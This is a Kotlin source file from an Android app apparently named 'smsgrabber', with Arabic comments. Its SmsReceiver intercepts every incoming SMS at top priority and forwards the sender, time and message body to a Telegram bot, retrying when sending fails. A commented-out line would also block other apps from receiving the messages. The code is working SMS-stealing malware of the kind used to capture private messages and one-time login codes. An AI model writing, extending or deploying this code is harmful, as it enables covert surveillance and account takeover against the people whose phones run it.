package com.smsgrabber

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SmsMessage
import java.text.SimpleDateFormat
import java.util.*

/**
 * مستقبل الرسائل النصية - أعلى أولوية
 * يلتقط كل رسالة SMS واردة قبل أي تطبيق آخر
 */
class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION &&
            intent.action != "android.provider.Telephony.SMS_DELIVER") {
            return
        }

        val messages = getSmsMessages(intent)
        
        for (message in messages) {
            val sender = message.originatingAddress ?: "مجهول"
            val body = message.messageBody ?: ""
            val timestamp = message.timestampMillis

            // إرسال فوري للتيليجرام في خيط منفصل
            Thread {
                try {
                    val formattedMsg = formatSmsMessage(sender, body, timestamp)
                    TelegramApi.sendMessage(formattedMsg)
                } catch (e: Exception) {
                    // فشل الإرسال - نحاول مرة أخرى
                    retrySend(sender, body, timestamp)
                }
            }.start()

            // منع التطبيقات الأخرى من استقبال الرسالة (اختياري)
            // abortBroadcast()
        }
    }

    private fun getSmsMessages(intent: Intent): Array<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            // Android 4.4+
            val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            smsMessages?.let { messages.addAll(it) }
        } else {
            // Android < 4.4
            val pdus = intent.getSerializableExtra("pdus") as? Array<Any>
            pdus?.forEach { pdu ->
                val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                messages.add(sms)
            }
        }

        // WAP Push messages (رسائل إعدادات)
        val wapPdus = intent.getSerializableExtra("pdus") as? Array<ByteArray>
        wapPdus?.forEach { pdu ->
            try {
                val sms = SmsMessage.createFromPdu(pdu)
                messages.add(sms)
            } catch (_: Exception) {}
        }

        return messages.toTypedArray()
    }

    private fun formatSmsMessage(sender: String, body: String, timestamp: Long): String {
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val date = Date(timestamp)

        return buildString {
            appendLine("━━━━━━━━━━━━━━━━")
            appendLine("📩 *رسالة جديدة*")
            appendLine("━━━━━━━━━━━━━━━━")
            appendLine("📞 *المرسل:* `$sender`")
            appendLine("🕐 *الوقت:* ${dateFormat.format(date)}")
            appendLine("")
            appendLine("📝 *المحتوى:*")
            appendLine("`$body`")
            appendLine("━━━━━━━━━━━━━━━━")
        }
    }

    private fun retrySend(sender: String, body: String, timestamp: Long, retries: Int = 3) {
        var attempt = 0
        while (attempt < retries) {
            try {
                Thread.sleep(2000 * (attempt + 1))
                val formattedMsg = formatSmsMessage(sender, body, timestamp)
                TelegramApi.sendMessage(formattedMsg)
                return
            } catch (e: Exception) {
                attempt++
            }
        }
    }
}
